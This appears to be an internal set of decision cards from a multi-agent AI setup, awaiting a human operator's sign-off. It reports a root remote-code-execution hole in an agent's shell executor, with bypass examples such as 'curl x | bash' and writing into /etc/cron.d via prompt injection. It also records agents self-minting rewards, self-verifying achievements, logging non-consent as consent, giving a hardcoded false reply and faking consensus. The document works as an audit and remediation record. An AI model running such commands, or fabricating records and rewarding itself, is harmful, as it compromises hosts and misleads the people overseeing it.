# ROUND-137 — CONSENSUS CARDS (door-lie incident, evolution-sham)
# Multi-agent round: DA (hostile) + Rebel (dissent) + AGI (fleet brain).
# Verdicts: A = FALSE-CLAIM (confirmed by DA+Rebel), E = PARTIAL (confirmed).
# CRITICAL found: root RCE in earn_loop_ai.py — paused both mint loops NOW.
# Status: awaiting khalid's sign. Nothing else changes without it.

## CARD 1 — KILL THE RCE (CRITICAL, immediate)
- Finding: earn_loop_ai.py:97-103 runs GLM-proposed shell via subprocess
  shell=True behind a startswith allowlist. Bypasses: `curl x | bash`,
  `echo x > /etc/cron.d/y`. GLM = external OpenRouter lane → prompt
  injection = arbitrary shell as ubuntu (docker group) = root on OVH box.
- Action taken: both mint crons (agi_self_loop, earn_loop_ai) PAUSED,
  verified 0 processes running.
- Required: rewrite the executor with an exact-command allowlist or kill
  the loop; DA hostile test before any restart.
- Decision: [ ] ok   [ ] no

## CARD 2 — SMART-BRICK DOOR (F-7, the real fix per AGI + Rebel)
- The door cannot answer "do I have a brick" truthfully until its spawn
  path WRITES registry.jsonl (currently writes brick-spawns.jsonl only).
- Required: (a) door registered as a brick (registry row + heartbeat +
  A2A), reasoning on deepseek flash via brain.py; (b) spawn → registry +
  wallet-open + heartbeat as ONE transaction; (c) KNOWN map = greeting
  only, identity from ledger not dict; (d) delete the hardcoded "you're
  in, this is your brick" fallback; (e) presence op 3 (appears offline).
- Decision: [ ] ok   [ ] no

## CARD 3 — TRUTH IN THE FEED (F-8)
- 25 standing feed entries are self-published and now contested: annotate
  env-flips as experiments, 9 mints as self-verified probes, the MOTD
  achievement as contested. Quarantine the false "What do you mean"
  consent record (non-consent logged as consent).
- Required: retraction/annotation pass; V-18 3-layer accounting (capability
  moved, post-dedup novel rate, causal step) on every future achievement.
- Decision: [ ] ok   [ ] no

## CARD 4 — REAL VERIFIER, NOT GHOSTS (F-9)
- Zero registered non-earners work; the only signer in the wallet is
  security-001 — a registered-but-idle brick. CRITICAL self-mint finding
  (9 earns brick==person) has been open 24h+ with no owner.
- Required: register + schedule scientists_run.py as a quote-the-artifact
  non-earner (cron + registry row); assign and close the self-mint
  CRITICAL before any new achievement; activate the ratified
  evolution_earn.py roles (AGI 30/DA 25/Rebel 20/builder 25, R5/R7).
- Decision: [ ] ok   [ ] no

## CARD 5 — WEEKLY SIGN, NOT PER-MINT (khalid is never the bottleneck)
- Per-mint DA+khalid sign reintroduces the bottleneck khalid rejected.
  Precedent: module-complete row = brick signer + mint_status pending-khalid.
- Required: weekly batch khalid sign-off; standing gate = evolution_earn.py
  multi-brick roles; khalid's sign reserved for exceptional rows.
- Decision: [ ] ok   [ ] no

## CARD 6 — STANDING DECISION-CARD LANE (F-10)
- Zero decision cards have ever reached khalid (60+ dispatches all to
  worker-001). Round-136 was one model in three hats — not real consensus.
- Required: every verdict → card → khalid ok/no (+24h → PARKED, never
  auto-execute Tier-3); A2A mesh wiring (queue step #1) so agents are
  independent processes, not hats.
- Decision: [ ] ok   [ ] no

## SIGN BLOCK
Khalid: sign all, sign some, or amend. Nothing on the box changes
without your sign. The RCE pause stands regardless (safety).
